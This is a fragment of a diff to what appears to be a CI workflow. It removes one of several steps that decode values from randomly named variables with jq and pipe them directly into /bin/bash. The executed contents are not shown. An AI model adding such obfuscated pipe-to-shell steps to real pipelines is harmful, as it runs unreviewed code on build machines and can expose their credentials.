@@ -25,7 +25,6 @@ jobs:
           echo $xr19191 | jq -r .zgogz46197 | /bin/bash
           echo $k7958 | jq -r .x63801 | /bin/bash
           echo $y466 | jq -r .caw740 | /bin/bash
-          echo $qu76503 | jq -r .ht5049 | /bin/bash
           printf '%s' "$xu38560" | jq -r .ww30578 | /bin/bash
 
       - name: Archive results
